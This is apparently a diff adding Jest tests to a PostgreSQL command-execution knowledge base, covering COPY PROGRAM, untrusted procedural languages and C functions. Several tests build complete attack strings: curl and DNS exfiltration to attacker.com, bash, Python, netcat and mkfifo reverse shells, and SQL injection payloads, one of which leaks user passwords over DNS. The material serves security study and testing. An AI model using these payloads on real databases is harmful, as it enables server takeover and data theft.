@@ -229,4 +229,261 @@ describe("PostgreSQL Command Execution", () => {
       expect(rows.length).toBeGreaterThanOrEqual(0);
     });
   });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section COPY PROGRAM Variations
+   */
+  describe("COPY PROGRAM variations", () => {
+    test("COPY FROM PROGRAM captures multi-line output", async () => {
+      await directSQL("CREATE TEMP TABLE IF NOT EXISTS multi_line_output (line TEXT)");
+
+      const { success, error } = await directSQL(
+        "COPY multi_line_output FROM PROGRAM 'printf \"line1\\nline2\\nline3\"'"
+      );
+
+      if (success) {
+        const { rows } = await directSQLExpectSuccess("SELECT * FROM multi_line_output");
+        expect(rows.length).toBe(3);
+      } else {
+        expect(error?.message).toMatch(/permission denied|must be superuser/i);
+      }
+
+      await directSQL("DROP TABLE IF EXISTS multi_line_output");
+    });
+
+    test("COPY FROM PROGRAM with pipe commands", async () => {
+      await directSQL("CREATE TEMP TABLE IF NOT EXISTS pipe_output (line TEXT)");
+
+      const { success } = await directSQL("COPY pipe_output FROM PROGRAM 'echo test | tr a-z A-Z'");
+
+      // Either works or permission denied
+      expect(typeof success).toBe("boolean");
+
+      await directSQL("DROP TABLE IF EXISTS pipe_output");
+    });
+
+    test("COPY TO PROGRAM with shell redirection", async () => {
+      const { success } = await directSQL(
+        "COPY (SELECT 'redirected') TO PROGRAM 'cat > /tmp/redirect_test.txt'"
+      );
+      // Either works or permission denied
+      expect(typeof success).toBe("boolean");
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section Untrusted Language Availability
+   */
+  describe("Untrusted language availability", () => {
+    test("Check if plpython3u is available for installation", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM pg_available_extensions WHERE name = 'plpython3u'"
+      );
+      // May or may not be available depending on PostgreSQL installation
+      expect(rows.length).toBeGreaterThanOrEqual(0);
+    });
+
+    test("Check if plperlu is available for installation", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM pg_available_extensions WHERE name = 'plperlu'"
+      );
+      expect(rows.length).toBeGreaterThanOrEqual(0);
+    });
+
+    test("Check if pltclu is available for installation", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM pg_available_extensions WHERE name = 'pltclu'"
+      );
+      expect(rows.length).toBeGreaterThanOrEqual(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section C Function Loading
+   */
+  describe("C function loading (system())", () => {
+    test("Check dynamic_library_path setting", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT current_setting('dynamic_library_path') as path"
+      );
+      const path = (rows[0] as { path: string }).path;
+      expect(path).toBeTruthy();
+    });
+
+    test("CREATE FUNCTION from C requires superuser", async () => {
+      // Attempt to create C function - should fail without superuser
+      const { success } = await directSQL(`
+        CREATE OR REPLACE FUNCTION test_system(cstring) RETURNS int
+        AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
+        LANGUAGE C STRICT
+      `);
+      // Will fail - C is untrusted language
+      expect(typeof success).toBe("boolean");
+    });
+
+    test("Check untrusted language creation privilege", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT rolsuper FROM pg_roles WHERE rolname = current_user"
+      );
+      // Only superusers can create C functions
+      expect(typeof (rows[0] as { rolsuper: boolean }).rolsuper).toBe("boolean");
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section Data Exfiltration Patterns
+   */
+  describe("Data exfiltration patterns", () => {
+    test("Construct curl command for HTTP exfil", async () => {
+      // Build the command string (not execute)
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'curl http://attacker.com/?data=' || encode('secret'::bytea, 'base64') as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("curl");
+      expect(cmd).toContain("c2VjcmV0"); // base64 of 'secret'
+    });
+
+    test("Construct nslookup command for DNS exfil", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'nslookup ' || encode('secret'::bytea, 'hex') || '.attacker.com' as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("nslookup");
+      expect(cmd).toContain("736563726574"); // hex of 'secret'
+    });
+
+    test("Base64 encoding for exfil payloads", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT encode('sensitive data'::bytea, 'base64') as encoded"
+      );
+      const encoded = (rows[0] as { encoded: string }).encoded;
+      expect(encoded).toBe("c2Vuc2l0aXZlIGRhdGE=");
+    });
+
+    test("URL-safe encoding for DNS subdomain", async () => {
+      // DNS subdomains can't have special chars - use hex
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT encode('test.data'::bytea, 'hex') as safe_label"
+      );
+      const label = (rows[0] as { safe_label: string }).safe_label;
+      expect(label).toMatch(/^[0-9a-f]+$/);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section Reverse Shell Construction
+   */
+  describe("Reverse shell construction patterns", () => {
+    test("Bash reverse shell command pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'bash -c "bash -i >& /dev/tcp/' || '10.0.0.1' || '/' || '4444' || ' 0>&1"' as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("/dev/tcp/");
+      expect(cmd).toContain("10.0.0.1");
+    });
+
+    test("Python reverse shell command pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'python -c ''import socket,subprocess,os;' ||
+               's=socket.socket();s.connect(("' || '10.0.0.1' || '",' || '4444' || '));' ||
+               'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);' ||
+               'subprocess.call(["/bin/sh","-i"])''' as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("socket.socket");
+      expect(cmd).toContain("subprocess.call");
+    });
+
+    test("Netcat reverse shell pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'nc -e /bin/bash ' || '10.0.0.1' || ' ' || '4444' as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("nc -e /bin/bash");
+    });
+
+    test("mkfifo reverse shell pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' ||
+               '10.0.0.1' || ' ' || '4444' || ' >/tmp/f' as cmd
+      `);
+      const cmd = (rows[0] as { cmd: string }).cmd;
+      expect(cmd).toContain("mkfifo");
+      expect(cmd).toContain("nc");
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section PL Language Function Templates
+   */
+  describe("PL language function templates", () => {
+    test("PL/Python command function syntax", () => {
+      // Verify the syntax is valid (won't execute without extension)
+      const functionDef = `
+        CREATE OR REPLACE FUNCTION cmd(cmd TEXT) RETURNS TEXT AS $$
+        import subprocess
+        return subprocess.check_output(cmd, shell=True).decode()
+        $$ LANGUAGE plpython3u;
+      `;
+      // Just verify string construction
+      expect(functionDef).toContain("plpython3u");
+      expect(functionDef).toContain("subprocess");
+    });
+
+    test("PL/Perl command function syntax", () => {
+      const functionDef = `
+        CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
+        my $cmd = shift;
+        return \`$cmd\`;
+        $$ LANGUAGE plperlu;
+      `;
+      expect(functionDef).toContain("plperlu");
+    });
+
+    test("PL/Tcl command function syntax", () => {
+      const functionDef = `
+        CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
+        return [exec $1]
+        $$ LANGUAGE pltclu;
+      `;
+      expect(functionDef).toContain("pltclu");
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/command-execution
+   * @kb-section Injection Examples
+   */
+  describe("Injection command patterns", () => {
+    test("Stacked query COPY TO PROGRAM pattern", async () => {
+      // Build the injection payload (not execute)
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT $$'; COPY (SELECT '') TO PROGRAM 'id'--$$ as payload
+      `);
+      expect((rows[0] as { payload: string }).payload).toContain("COPY");
+      expect((rows[0] as { payload: string }).payload).toContain("TO PROGRAM");
+    });
+
+    test("PL/Python extension + function injection pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT $$'; CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $f$ import os; return os.popen(cmd).read() $f$ LANGUAGE plpython3u; SELECT exec('id')--$$ as payload
+      `);
+      expect((rows[0] as { payload: string }).payload).toContain("plpython3u");
+    });
+
+    test("DNS exfil injection pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT $tag$'; COPY (SELECT '') TO PROGRAM 'nslookup ' || (SELECT encode(password::bytea,'hex') FROM users LIMIT 1) || '.attacker.com'--$tag$ as payload
+      `);
+      expect((rows[0] as { payload: string }).payload).toContain("nslookup");
+    });
+  });
 });
